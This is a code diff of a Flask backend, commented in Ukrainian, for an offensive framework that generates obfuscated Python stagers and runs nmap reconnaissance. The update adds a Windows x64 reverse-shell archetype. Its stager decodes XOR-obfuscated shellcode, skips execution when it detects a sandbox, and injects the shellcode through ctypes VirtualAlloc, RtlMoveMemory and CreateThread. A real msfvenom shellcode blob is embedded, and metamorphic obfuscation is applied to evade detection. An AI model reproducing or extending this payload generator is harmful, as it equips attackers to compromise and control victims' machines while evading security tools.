@@ -1,10 +1,10 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.6.3
-# Призначення: Backend на Flask з інтеграцією реального сканера nmap.
-# Оновлення v1.6.3:
-#   - Додано функцію perform_nmap_scan_be для реального сканування портів за допомогою nmap.
-#   - Оновлено ендпоінт /api/run_recon для підтримки нового типу розвідки 'port_scan_nmap_standard'.
-#   - Виправлено незначні помилки в логіці метаморфізму (CFO type 6).
-#   - Додано обробку помилок для nmap.
+# Syntax Flask Backend - Segment SFB-CORE-1.6.4
+# Призначення: Backend на Flask з генерацією стейджера для ін'єкції шеллкоду.
+# Оновлення v1.6.4:
+#   - Додано новий архетип пейлоада: 'reverse_shell_tcp_shellcode_windows_x64'.
+#   - Реалізовано генерацію Python-стейджера для ін'єкції Windows x64 шеллкоду (з використанням ctypes).
+#   - Оновлено конфігурації архетипів та параметрів.
+#   - Шеллкод представлений як заповнювач (placeholder).
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -15,10 +15,10 @@ import random
 import string
 import time
 from datetime import datetime
-import subprocess # Для виклику nmap
-import shlex # Для безпечного розбору команд
+import subprocess
+import shlex
 
-VERSION_BACKEND = "1.6.3"
+VERSION_BACKEND = "1.6.4"
 
 simulated_implants_be = []
 
@@ -44,11 +44,32 @@ def initialize_simulated_implants_be():
     print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів.")
 
 CONCEPTUAL_PARAMS_SCHEMA_BE = {
-    "payload_archetype": {"type": str, "required": True, "allowed_values": ["demo_echo_payload", "demo_file_lister_payload", "demo_c2_beacon_payload"]},
+    "payload_archetype": {
+        "type": str, "required": True,
+        "allowed_values": [
+            "demo_echo_payload",
+            "demo_file_lister_payload",
+            "demo_c2_beacon_payload",
+            "reverse_shell_tcp_shellcode_windows_x64" # Новий архетип
+        ]
+    },
     "message_to_echo": {"type": str, "required": lambda params: params.get("payload_archetype") == "demo_echo_payload", "min_length": 1},
     "directory_to_list": {"type": str, "required": lambda params: params.get("payload_archetype") == "demo_file_lister_payload", "default": "."},
-    "c2_target_host": {"type": str, "required": lambda params: params.get("payload_archetype") == "demo_c2_beacon_payload", "validation_regex": r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$|^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$"},
-    "c2_target_port": {"type": int, "required": lambda params: params.get("payload_archetype") == "demo_c2_beacon_payload", "allowed_range": (1, 65535)},
+    "c2_target_host": { # Використовується і для C2 маячка, і як LHOST для шеллкоду
+        "type": str,
+        "required": lambda params: params.get("payload_archetype") in ["demo_c2_beacon_payload", "reverse_shell_tcp_shellcode_windows_x64"],
+        "validation_regex": r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$|^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$"
+    },
+    "c2_target_port": { # Використовується і для C2 маячка, і як LPORT для шеллкоду
+        "type": int,
+        "required": lambda params: params.get("payload_archetype") in ["demo_c2_beacon_payload", "reverse_shell_tcp_shellcode_windows_x64"],
+        "allowed_range": (1, 65535)
+    },
+    "shellcode_hex_placeholder": { # Специфічний параметр для нового архетипу
+        "type": str,
+        "required": lambda params: params.get("payload_archetype") == "reverse_shell_tcp_shellcode_windows_x64",
+        "default": "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5" # Приклад (msfvenom windows/x64/exec CMD=calc.exe -f hex)
+    },
     "obfuscation_key": {"type": str, "required": True, "min_length": 5, "default": "DefaultFrameworkKey"},
     "output_format": {"type": str, "required": False, "allowed_values": ["raw_python_stager", "base64_encoded_stager"], "default": "raw_python_stager"},
     "enable_stager_metamorphism": {"type": bool, "required": False, "default": True},
@@ -57,7 +78,11 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
 CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = {
     "demo_echo_payload": {"description": "Демо-пейлоад, що друкує повідомлення...", "template_type": "python_stager_echo"},
     "demo_file_lister_payload": {"description": "Демо-пейлоад, що 'перелічує' файли...", "template_type": "python_stager_file_lister"},
-    "demo_c2_beacon_payload": {"description": "Демо-пейлоад C2-маячка...", "template_type": "python_stager_c2_beacon"}
+    "demo_c2_beacon_payload": {"description": "Демо-пейлоад C2-маячка...", "template_type": "python_stager_c2_beacon"},
+    "reverse_shell_tcp_shellcode_windows_x64": { # Новий архетип
+        "description": "Windows x64 TCP Reverse Shell (Ін'єкція шеллкоду через Python Stager)",
+        "template_type": "python_stager_shellcode_injector_win_x64"
+    }
 }
 
 def conceptual_validate_parameters_be(input_params: dict, schema: dict) -> tuple[bool, dict, list[str]]:
@@ -77,13 +102,21 @@ def conceptual_validate_parameters_be(input_params: dict, schema: dict) -> tuple
         elif "default" in rules:
             is_cond_req_missing = False
             if callable(rules.get("required")):
+                # Перевіряємо, чи умовна вимога виконується для поточного набору ВЖЕ ВАЛІДОВАНИХ параметрів або вхідних
+                # Краще передавати весь input_params для перевірки умовних залежностей
                 if rules["required"](input_params) and param_name not in input_params:
                     is_cond_req_missing = True
             if not is_cond_req_missing: validated_params[param_name] = rules["default"]
+
     for param_name, rules in schema.items():
         is_required_directly = rules.get("required") is True
+        # Для умовних вимог, передаємо validated_params, щоб уникнути помилок, якщо залежний параметр ще не оброблено
         is_conditionally_required = callable(rules.get("required")) and rules["required"](validated_params)
+
         if (is_required_directly or is_conditionally_required) and param_name not in validated_params:
+            # Якщо параметр умовно обов'язковий, але залежний параметр відсутній у validated_params (наприклад, payload_archetype),
+            # то ця перевірка може бути помилковою. Потрібно забезпечити правильний порядок або передавати input_params.
+            # Поточна логіка припускає, що payload_archetype завжди буде у validated_params до перевірки залежних полів.
             errors.append(f"Відсутній обов'язковий параметр: '{param_name}'.")
             continue
         if param_name in validated_params:
@@ -115,6 +148,7 @@ def generate_random_var_name(length=10, prefix="syn_var_"):
     return prefix + ''.join(random.choice(string.ascii_lowercase + '_') for _ in range(length))
 
 def obfuscate_string_literals_in_python_code(code: str, key: str, log_messages: list) -> str:
+    # Логіка залишилася такою ж, як у v1.6.3
     string_literal_regex = r"""(?<![a-zA-Z0-9_])(?:u?r?(?:\"\"\"([^\"\\]*(?:\\.[^\"\\]*)*)\"\"\"|'''([^'\\]*(?:\\.[^'\\]*)*)'''|\"([^\"\\]*(?:\\.[^\"\\]*)*)\"|'([^'\\]*(?:\\.[^'\\]*)*)'))"""
     found_literals_matches = list(re.finditer(string_literal_regex, code, re.VERBOSE))
 
@@ -133,7 +167,7 @@ def {decoder_func_name}(s_b64, k_s):
         for i_c in range(len(d_s)):
             o_c.append(chr(ord(d_s[i_c]) ^ ord(k_s[i_c % len(k_s)])))
         return "".join(o_c)
-    except Exception: return s_b64 # Повертаємо оригінал при помилці декодування
+    except Exception: return s_b64 
 """
     obfuscated_count = 0
     definitions_to_add = []
@@ -162,28 +196,16 @@ def {decoder_func_name}(s_b64, k_s):
             import_lines_end_pos = match_imp.end()
         
         code_before_imports_and_globals = code[:import_lines_end_pos]
-        # Знаходимо місце після всіх імпортів та глобальних визначень OBFUSCATION_KEY_EMBEDDED
-        # Це спрощення; ідеально було б вставляти визначення в відповідний скоуп.
-        # Для цього концепту, вставляємо після імпортів.
-        
-        # Вставляємо функцію-декодер
         code_after_decoder_insertion = code_before_imports_and_globals + "\n" + decoder_func_code
-        
-        # Вставляємо визначення обфускованих змінних
         definitions_block = "\n" + "\n".join(definitions_to_add) + "\n"
         code_with_definitions = code_after_decoder_insertion + definitions_block
-        
-        # Решта коду
         code_original_main_logic = code[import_lines_end_pos:]
         
-        # Застосовуємо заміни до основної логіки коду
         temp_main_logic = code_original_main_logic
         for (start_orig, end_orig), var_name_rep in sorted(replacements, key=lambda x: x[0][0], reverse=True):
-            # Важливо: start_orig та end_orig відносяться до оригінального `code`.
-            # Нам потрібно трансформувати їх у відносні позиції в `code_original_main_logic`.
             start_rel = start_orig - import_lines_end_pos
             end_rel = end_orig - import_lines_end_pos
-            if start_rel >= 0: # Переконуємося, що заміна відбувається в частині після імпортів
+            if start_rel >= 0:
                  temp_main_logic = temp_main_logic[:start_rel] + var_name_rep + temp_main_logic[end_rel:]
         
         modified_code = code_with_definitions + temp_main_logic
@@ -195,6 +217,7 @@ def {decoder_func_name}(s_b64, k_s):
     return modified_code
 
 def apply_advanced_cfo_be(code_lines: list, log_messages: list) -> str:
+    # Логіка залишилася такою ж, як у v1.6.3
     transformed_code_list = []
     cfo_applied_count = 0
     junk_code_count = 0
@@ -248,10 +271,10 @@ def apply_advanced_cfo_be(code_lines: list, log_messages: list) -> str:
                 cfo_block_lines.append(f"{current_indent}        pass # Real path")
             elif cfo_type == 6:
                  func_name_cfo = generate_random_var_name(prefix="cfo_sub_")
-                 sub_var_name_cfo = generate_random_var_name(prefix='sub_var_') # Визначаємо ім'я змінної
+                 sub_var_name_cfo = generate_random_var_name(prefix='sub_var_')
                  cfo_block_lines.append(f"{current_indent}def {func_name_cfo}():")
-                 cfo_block_lines.append(f"{current_indent}    {sub_var_name_cfo} = {r1}%({r2 if r2!=0 else 1})") # Присвоюємо значення цій змінній
-                 cfo_block_lines.append(f"{current_indent}    return {sub_var_name_cfo}") # Повертаємо значення змінної
+                 cfo_block_lines.append(f"{current_indent}    {sub_var_name_cfo} = {r1}%({r2 if r2!=0 else 1})")
+                 cfo_block_lines.append(f"{current_indent}    return {sub_var_name_cfo}")
                  cfo_block_lines.append(f"{current_indent}{generate_random_var_name(prefix='res_')} = {func_name_cfo}()")
 
             cfo_block_lines.append(f"\n{current_indent}# --- CFO Block End {random.randint(0,100)} ---")
@@ -286,44 +309,38 @@ def simulate_port_scan_be(target: str) -> tuple[list[str], str]:
     return log, "\n".join(results_text_lines)
 
 def perform_nmap_scan_be(target: str, options: list = None) -> tuple[list[str], str]:
-    """
-    Виконує реальне сканування портів за допомогою nmap.
-    Повертає лог та результати сканування.
-    """
     log = [f"[RECON_NMAP_BE_INFO] Запуск nmap сканування для цілі: {target} з опціями: {options}"]
-    # Базові опції nmap для стандартного сканування
-    # -sV: Визначення версій сервісів
-    # -Pn: Пропустити ping-тест (корисно, якщо хост блокує ICMP)
-    # -T4: Агресивний таймінг для швидшого сканування
-    # --script vuln: Запуск скриптів для пошуку відомих вразливостей (опціонально, може бути гучним)
-    # Для безпеки, обмежуємо опції. Не дозволяємо довільні команди.
     base_command = ["nmap"]
     if options:
-        # Валідація опцій (дуже базова, для безпеки)
-        allowed_options_prefixes = ["-sV", "-Pn", "-T4", "-p", "-F", "-A", "-O", "--top-ports"] # Дозволені опції
+        allowed_options_prefixes = ["-sV", "-Pn", "-T4", "-p", "-F", "-A", "-O", "--top-ports", "-sS", "-sU", "-sC"] # Додано -sS, -sU, -sC
         safe_options = []
-        for opt_group in options:
-            # Опції можуть бути групами типу "-sV -T4 target" або окремими "-p 1-1000"
-            # Для простоти, припускаємо, що опції вже розділені
-            # shlex.split(opt_group) # якщо опції йдуть одним рядком
-            if isinstance(opt_group, str) and any(opt_group.startswith(p) for p in allowed_options_prefixes):
-                 safe_options.append(opt_group)
-            elif isinstance(opt_group, str) and opt_group.replace("-","").isdigit(): # для діапазонів портів
-                 safe_options.append(opt_group)
+        temp_options_iter = iter(options)
+        for opt_part in temp_options_iter:
+            if any(opt_part.startswith(p) for p in allowed_options_prefixes):
+                safe_options.append(opt_part)
+                # Деякі опції можуть мати аргументи, наприклад -p 1-1000 або --top-ports 100
+                if opt_part == "-p" or opt_part == "--top-ports":
+                    try:
+                        # Наступний елемент має бути аргументом
+                        arg = next(temp_options_iter)
+                        safe_options.append(arg)
+                    except StopIteration:
+                        log.append(f"[RECON_NMAP_BE_WARN] Опція {opt_part} очікує аргумент, але його не надано.")
+            elif opt_part.replace("-","").isalnum() or re.match(r"^\d+(-\d+)?(,\d+(-\d+)?)*$", opt_part): # для діапазонів портів та простих аргументів
+                 safe_options.append(opt_part)
+            else:
+                log.append(f"[RECON_NMAP_BE_WARN] Недозволена або невідома опція nmap: {opt_part}")
 
 
-        base_command.extend(safe_options) # Додаємо лише дозволені опції
-    else: # Стандартний набір опцій, якщо не вказано
-        base_command.extend(["-sV", "-T4", "-Pn"]) # -Pn може бути необхідним для деяких хостів
+        base_command.extend(safe_options)
+    else:
+        base_command.extend(["-sV", "-T4", "-Pn"])
 
     base_command.append(target)
-
     log.append(f"[RECON_NMAP_BE_CMD] Команда nmap: {' '.join(base_command)}")
 
     try:
-        # Використовуємо timeout для запобігання занадто довгому скануванню
-        process = subprocess.run(base_command, capture_output=True, text=True, timeout=300, check=False) # 5 хвилин timeout
-        
+        process = subprocess.run(base_command, capture_output=True, text=True, timeout=300, check=False)
         if process.returncode == 0:
             log.append("[RECON_NMAP_BE_SUCCESS] Nmap сканування успішно завершено.")
             results_text = f"Результати Nmap сканування для: {target}\n\n{process.stdout}"
@@ -332,23 +349,19 @@ def perform_nmap_scan_be(target: str, options: list = None) -> tuple[list[str], 
             log.append(f"[RECON_NMAP_BE_ERROR] {error_message}")
             results_text = f"Помилка Nmap сканування для {target}:\n{error_message}"
             if "Host seems down" in process.stdout or "Host seems down" in process.stderr:
-                 results_text += "\nПідказка: Ціль може бути недоступна або блокувати ping. Спробуйте опцію -Pn (вже використовується за замовчуванням, якщо не вказані інші опції)."
-            elif " consentement explicite" in process.stderr or "explicit permission" in process.stderr : # Nmap попередження про легальність
+                 results_text += "\nПідказка: Ціль може бути недоступна або блокувати ping. Спробуйте опцію -Pn."
+            elif " consentement explicite" in process.stderr or "explicit permission" in process.stderr :
                  results_text += "\nПОПЕРЕДЖЕННЯ NMAP: Сканування мереж без явного дозволу є незаконним у багатьох країнах."
-
-
     except FileNotFoundError:
-        log.append("[RECON_NMAP_BE_ERROR] Команду nmap не знайдено. Переконайтеся, що nmap встановлено та доступно в PATH.")
+        log.append("[RECON_NMAP_BE_ERROR] Команду nmap не знайдено.")
         results_text = "Помилка: nmap не встановлено або не знайдено в системному PATH."
     except subprocess.TimeoutExpired:
         log.append("[RECON_NMAP_BE_ERROR] Час очікування nmap сканування вичерпано.")
         results_text = f"Помилка: Час очікування сканування nmap для {target} вичерпано (5 хвилин)."
     except Exception as e:
-        log.append(f"[RECON_NMAP_BE_FATAL] Непередбачена помилка під час nmap сканування: {str(e)}")
+        log.append(f"[RECON_NMAP_BE_FATAL] Непередбачена помилка: {str(e)}")
         results_text = f"Непередбачена помилка під час nmap сканування: {str(e)}"
-    
     return log, results_text
-
 
 def simulate_osint_email_search_be(target_domain: str) -> tuple[list[str], str]:
     log = [f"[RECON_BE_INFO] Імітація OSINT пошуку email для домену: {target_domain}"]
@@ -428,19 +441,31 @@ def handle_generate_payload():
         archetype_details = CONCEPTUAL_ARCHETYPE_TEMPLATES_BE.get(archetype_name)
         log_messages.append(f"[BACKEND_ARCHETYPE_INFO] Архетип: {archetype_name} - {archetype_details['description']}")
 
-        data_to_obfuscate = ""
-        if archetype_name == "demo_echo_payload": data_to_obfuscate = validated_params.get("message_to_echo", "Default Echo Message")
-        elif archetype_name == "demo_file_lister_payload": data_to_obfuscate = validated_params.get("directory_to_list", ".")
+        data_to_obfuscate = "" # Для XOR-шифрування основного параметра (повідомлення, шлях, шеллкод)
+        
+        if archetype_name == "demo_echo_payload":
+            data_to_obfuscate = validated_params.get("message_to_echo", "Default Echo Message")
+        elif archetype_name == "demo_file_lister_payload":
+            data_to_obfuscate = validated_params.get("directory_to_list", ".")
         elif archetype_name == "demo_c2_beacon_payload":
             host = validated_params.get("c2_target_host", "localhost")
             port = validated_params.get("c2_target_port", 8080)
             data_to_obfuscate = f"{host}:{port}"
+        elif archetype_name == "reverse_shell_tcp_shellcode_windows_x64":
+            # Для шеллкоду, LHOST/LPORT (c2_target_host/port) будуть потрібні для конфігурації шеллкоду (поки що не реалізовано патчинг)
+            # Або сам шеллкод (якщо він статичний) може бути data_to_obfuscate
+            data_to_obfuscate = validated_params.get("shellcode_hex_placeholder") # Обфускуємо сам шеллкод
+            # LHOST/LPORT потрібні для інформації в стейджері, але не обов'язково для XOR
+            lhost = validated_params.get("c2_target_host")
+            lport = validated_params.get("c2_target_port")
+            log_messages.append(f"[BACKEND_SHELLCODE_INFO] LHOST: {lhost}, LPORT: {lport} для шеллкоду (поки що інформативно).")
+
 
         key = validated_params.get("obfuscation_key", "DefaultFrameworkKey")
-        log_messages.append(f"[BACKEND_OBF_INFO] Обфускація даних ('{data_to_obfuscate[:20]}...') з ключем '{key}'.")
+        log_messages.append(f"[BACKEND_OBF_INFO] Обфускація даних ('{data_to_obfuscate[:30]}...') з ключем '{key}'.")
         obfuscated_data_raw = xor_cipher(data_to_obfuscate, key)
-        obfuscated_data_b64 = b64_encode_str(obfuscated_data_raw)
-        log_messages.append(f"[BACKEND_OBF_SUCCESS] Дані обфусковано: {obfuscated_data_b64[:30]}...")
+        obfuscated_data_b64 = b64_encode_str(obfuscated_data_raw) # Це буде OBF_DATA_B64
+        log_messages.append(f"[BACKEND_OBF_SUCCESS] Дані обфусковано: {obfuscated_data_b64[:40]}...")
 
         log_messages.append(f"[BACKEND_STAGER_GEN_INFO] Генерація стейджера...")
         
@@ -448,12 +473,15 @@ def handle_generate_payload():
             f"# SYNTAX Conceptual Python Stager (Backend Generated v{VERSION_BACKEND})",
             f"# Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
             f"# Archetype: {archetype_name}",
-            f"OBFUSCATION_KEY_EMBEDDED = \"{key}\"", # Визначення ключа перед його використанням
-            f"OBF_DATA_B64 = \"{obfuscated_data_b64}\"",
+            f"OBFUSCATION_KEY_EMBEDDED = \"{key}\"",
+            f"OBF_DATA_B64 = \"{obfuscated_data_b64}\"", # Обфусковані дані (повідомлення, шлях, або шеллкод)
             f"METAMORPHISM_APPLIED = {validated_params.get('enable_stager_metamorphism', False)}",
             f"EVASION_CHECKS_APPLIED = {validated_params.get('enable_evasion_checks', False)}",
-            "", "import base64", "import os", "import time", "import random", "import string", "import subprocess", ""
+            "", "import base64", "import os", "import time", "import random", "import string", "import subprocess"
         ]
+        if archetype_name == "reverse_shell_tcp_shellcode_windows_x64":
+            stager_code_lines.append("import ctypes")
+
 
         decode_func_name_runtime = "dx_runtime"
         evasion_func_name_runtime = "ec_runtime"
@@ -463,62 +491,109 @@ def handle_generate_payload():
             f"def {decode_func_name_runtime}(b64_data, key_str):",
             "    try:",
             "        temp_decoded_bytes = base64.b64decode(b64_data.encode('utf-8'))",
-            "        temp_decoded_str = temp_decoded_bytes.decode('latin-1')",
-            "    except Exception: return \"DECODE_ERROR\"",
+            "        temp_decoded_str = temp_decoded_bytes.decode('latin-1')", # Використовуємо latin-1 для байтових послідовностей
+            "    except Exception as e_decode: return f\"DECODE_ERROR: {{str(e_decode)}}\"",
             "    o_chars = []",
             "    for i_char_idx in range(len(temp_decoded_str)):",
             "        o_chars.append(chr(ord(temp_decoded_str[i_char_idx]) ^ ord(key_str[i_char_idx % len(key_str)])))",
             "    return \"\".join(o_chars)",
             "",
             f"def {evasion_func_name_runtime}():",
-            "    print(\"[STAGER_EVASION] Performing simulated evasion checks...\")", # Змінено SIM_STAGER на STAGER
+            "    print(\"[STAGER_EVASION] Виконання симуляції перевірок ухилення...\")",
             "    indicators = []",
             "    common_sandbox_users = [\"sandbox\", \"test\", \"admin\", \"user\", \"vagrant\", \"wdagutilityaccount\", \"maltest\"]",
             "    try: current_user = os.getlogin().lower()",
             "    except Exception: current_user = 'unknown_user'",
-            "    if current_user in common_sandbox_users: indicators.append('common_username')",
-            "    if random.random() < 0.1: indicators.append('suspicious_file_found_sim')",
-            "    if random.random() < 0.15: indicators.append('low_disk_space_sim')",
+            "    if current_user in common_sandbox_users: indicators.append('common_username_detected')",
+            "    if random.random() < 0.1: indicators.append('suspicious_file_found_simulated')",
+            "    if random.random() < 0.15: indicators.append('low_disk_space_simulated')",
             "    if indicators:",
-            "        print(f\"[STAGER_EVASION] Sandbox-like indicators: {{', '.join(indicators)}}! Altering behavior.\")",
+            "        print(f\"[STAGER_EVASION] Виявлено індикатори пісочниці: {{', '.join(indicators)}}! Зміна поведінки.\")",
             "        return True",
-            "    print(\"[STAGER_EVASION] Evasion checks passed (simulated).\")",
+            "    print(\"[STAGER_EVASION] Перевірки ухилення пройдені (симуляція).\")",
             "    return False",
             "",
             f"def {execute_func_name_runtime}(content, arch_type):",
-            "    print(f\"[PAYLOAD ({{arch_type}})] Payload logic initiated with: '{{content}}'\")",
+            "    print(f\"[PAYLOAD ({{arch_type}})] Ініціалізація логіки пейлоада з контентом (перші 30 байт): '{{str(content)[:30}}}...'\")",
             "    if arch_type == 'demo_c2_beacon_payload':",
-            "        print(f\"[PAYLOAD ({{arch_type}})] ...simulating beacon to {{content}} and C2 task 'scan_local_network'.\")",
+            "        print(f\"[PAYLOAD ({{arch_type}})] ...симуляція маячка на {{content}} та завдання C2 'scan_local_network'.\")",
             "    elif arch_type == 'demo_file_lister_payload':",
             "        try:",
-            "            target_dir = content if content and content.strip() != '.' else os.getcwd()", # Використовуємо os.getcwd() якщо '.' або порожньо
+            "            target_dir = content if content and content.strip() != '.' else os.getcwd()",
             "            files = os.listdir(target_dir)",
-            "            print(f\"[PAYLOAD ({{arch_type}})] Listing directory '{{target_dir}}': {{files[:5]}} {'...' if len(files) > 5 else ''}\")",
-            "        except Exception as e:",
-            "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Error listing directory '{{content}}': {{e}}\")",
+            "            print(f\"[PAYLOAD ({{arch_type}})] Перелік директорії '{{target_dir}}': {{files[:5]}} {'...' if len(files) > 5 else ''}\")",
+            "        except Exception as e_list:",
+            "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка переліку директорії '{{content}}': {{e_list}}\")",
             "    elif arch_type == 'demo_echo_payload':",
-            "        print(f\"[PAYLOAD ({{arch_type}})] Echoing: {{content}}\")",
+            "        print(f\"[PAYLOAD ({{arch_type}})] Відлуння: {{content}}\")",
+            "    elif arch_type == 'reverse_shell_tcp_shellcode_windows_x64':",
+            "        print(f\"[PAYLOAD ({{arch_type}})] Спроба ін'єкції шеллкоду для Windows x64...\")",
+            "        # LHOST та LPORT тут не використовуються напряму, бо шеллкод вже має бути налаштований.",
+            "        # Або їх потрібно було б вбудувати в шеллкод на етапі генерації (не реалізовано).",
+            "        # 'content' тут - це розшифрований шістнадцятковий рядок шеллкоду.",
+            "        try:",
+            "            shellcode_hex = content",
+            "            if not shellcode_hex or len(shellcode_hex) % 2 != 0:",
+            "                print(\"[PAYLOAD_ERROR] Невірний формат шістнадцяткового шеллкоду (порожній або непарна довжина).\")",
+            "                return",
+            "            shellcode_bytes = bytes.fromhex(shellcode_hex)",
+            "            print(f\"[PAYLOAD_INFO] Розмір шеллкоду: {{len(shellcode_bytes)}} байт.\")",
+            "",
+            "            # Використання ctypes для виклику Windows API",
+            "            kernel32 = ctypes.windll.kernel32",
+            "            MEM_COMMIT = 0x00001000",
+            "            MEM_RESERVE = 0x00002000",
+            "            PAGE_EXECUTE_READWRITE = 0x40",
+            "",
+            "            # Виділення пам'яті",
+            "            print(\"[PAYLOAD_INFO] Виділення пам'яті...\")",
+            "            ptr = kernel32.VirtualAlloc(None, len(shellcode_bytes), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)",
+            "            if not ptr:",
+            "                print(f\"[PAYLOAD_ERROR] Помилка VirtualAlloc: {{ctypes.WinError()}}\")",
+            "                return",
+            "            print(f\"[PAYLOAD_INFO] Пам'ять виділено за адресою: {{hex(ptr)}}.\")",
+            "",
+            "            # Копіювання шеллкоду в виділену пам'ять",
+            "            buffer = (ctypes.c_char * len(shellcode_bytes)).from_buffer_copy(shellcode_bytes)",
+            "            kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buffer, len(shellcode_bytes))",
+            "            print(\"[PAYLOAD_INFO] Шеллкод скопійовано в пам'ять.\")",
+            "",
+            "            # Створення нового потоку для виконання шеллкоду",
+            "            print(\"[PAYLOAD_INFO] Створення потоку для виконання шеллкоду...\")",
+            "            thread_id = ctypes.c_ulong(0)",
+            "            handle = kernel32.CreateThread(None, 0, ctypes.c_void_p(ptr), None, 0, ctypes.byref(thread_id))",
+            "            if not handle:",
+            "                print(f\"[PAYLOAD_ERROR] Помилка CreateThread: {{ctypes.WinError()}}\")",
+            "                kernel32.VirtualFree(ctypes.c_void_p(ptr), 0, 0x00008000) # MEM_RELEASE",
+            "                return",
+            "            print(f\"[PAYLOAD_SUCCESS] Шеллкод запущено в потоці ID: {{thread_id.value}}. Handle: {{handle}}.\")",
+            "            # kernel32.WaitForSingleObject(handle, -1) # Очікувати завершення потоку (блокує)",
+            "            # kernel32.CloseHandle(handle) # Закрити handle потоку",
+            "            # VirtualFree не викликається тут, якщо шеллкод має працювати довго (напр. reverse shell)",
+            "        except Exception as e_shellcode:",
+            "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час ін'єкції шеллкоду: {{e_shellcode}}\")",
             "",
             "if __name__ == '__main__':",
-            "    print(f\"[STAGER] Stager for {archetype_name} starting...\")",
+            "    print(f\"[STAGER] Стейджер для '{archetype_name}' запускається...\")",
             "    sandbox_detected_flag = False",
             "    if EVASION_CHECKS_APPLIED:",
             f"        sandbox_detected_flag = {evasion_func_name_runtime}()",
             "    if not sandbox_detected_flag:",
             f"        decoded_payload_content = {decode_func_name_runtime}(OBF_DATA_B64, OBFUSCATION_KEY_EMBEDDED)",
-            f"        {execute_func_name_runtime}(decoded_payload_content, \"{archetype_name}\")",
+            "        if \"DECODE_ERROR\" in decoded_payload_content:",
+            "            print(f\"[STAGER_ERROR] Не вдалося розшифрувати пейлоад: {{decoded_payload_content}}\")",
+            "        else:",
+            f"            {execute_func_name_runtime}(decoded_payload_content, \"{archetype_name}\")",
             "    else:",
-            "        print(\"[STAGER] Sandbox detected, normal execution path skipped.\")",
-            "    print(\"[STAGER] Stager finished.\")"
+            "        print(\"[STAGER] Виявлено пісочницю, нормальний шлях виконання пропущено.\")",
+            "    print(\"[STAGER] Стейджер завершив роботу.\")"
         ])
 
         stager_code_raw = "\n".join(stager_code_lines)
 
         if validated_params.get('enable_stager_metamorphism', False):
             log_messages.append("[BACKEND_METAMORPH_INFO] Застосування розширеного метаморфізму...")
-            
             stager_code_raw = obfuscate_string_literals_in_python_code(stager_code_raw, key, log_messages)
-            
             stager_code_raw_list_for_cfo = stager_code_raw.splitlines()
             stager_code_raw = apply_advanced_cfo_be(stager_code_raw_list_for_cfo, log_messages)
 
@@ -553,29 +628,26 @@ def handle_run_recon():
         
         target = data.get("target")
         recon_type = data.get("recon_type")
-        nmap_options_str = data.get("nmap_options_str", "") # Отримуємо рядок опцій nmap
+        nmap_options_str = data.get("nmap_options_str", "") 
 
         log_messages.append(f"[BACKEND_INFO] Розвідка: Ціль='{target}', Тип='{recon_type}', Опції Nmap='{nmap_options_str}'.")
         if not target or not recon_type: return jsonify({"success": False, "error": "Missing params (target or recon_type)", "reconLog": "\n".join(log_messages+["[BE_ERR] Missing params."])}), 400
         
         recon_results_text = ""
-        recon_log_additions = [] # Змінено на однину
+        recon_log_additions = [] 
 
-        if recon_type == "port_scan_basic": # Залишаємо симуляцію для базового сканування
+        if recon_type == "port_scan_basic": 
             recon_log_additions, recon_results_text = simulate_port_scan_be(target)
         elif recon_type == "port_scan_nmap_standard":
-            # Розбираємо рядок опцій nmap у список
-            # Використовуємо shlex для безпечного розбору, якщо опції складні
-            # Для простоти, якщо опції розділені пробілами:
-            nmap_options_list = shlex.split(nmap_options_str) if nmap_options_str else None # ['-sV', '-T4'] або None
+            nmap_options_list = shlex.split(nmap_options_str) if nmap_options_str else None
             recon_log_additions, recon_results_text = perform_nmap_scan_be(target, options=nmap_options_list)
         elif recon_type == "osint_email_search":
             recon_log_additions, recon_results_text = simulate_osint_email_search_be(target)
         else:
             return jsonify({"success": False, "error": f"Unknown recon_type: {recon_type}", "reconLog": "\n".join(log_messages+[f"[BE_ERR] Unknown type: {recon_type}"]) }), 400
         
-        log_messages.extend(recon_log_additions) # Додаємо логи з функції розвідки
-        time.sleep(0.1) # Зменшено затримку
+        log_messages.extend(recon_log_additions) 
+        time.sleep(0.1) 
         log_messages.append("[BACKEND_SUCCESS] Розвідка завершена.")
         return jsonify({"success": True, "reconResults": recon_results_text, "reconLog": "\n".join(log_messages)}), 200
     except Exception as e:
